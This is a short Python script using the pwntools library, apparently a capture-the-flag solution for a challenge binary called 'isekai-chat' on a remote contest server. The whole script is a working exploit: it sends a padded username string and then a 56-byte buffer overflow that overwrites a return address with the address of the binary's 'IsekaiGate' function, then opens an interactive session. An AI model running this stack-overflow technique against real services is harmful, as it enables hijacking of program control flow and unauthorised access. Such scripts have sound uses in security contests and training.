from pwn import *

def exploit():
    # p = process("./isekai-chat")
    p = remote("chall.kbti.tech", 9998)
    binary = ELF("isekai-chat")

    padding = 0x20 - 0xc
    
    payload = ''
    payload += 'A' * padding
    payload += "%s"

    p.sendlineafter("username: ", payload)

    # gdb.attach(p)

    payload = ''
    payload += 'A' * 56
    payload += p32(binary.symbols["IsekaiGate"])

    p.sendlineafter(": ", payload)

    p.interactive()

if __name__ == "__main__":
    exploit()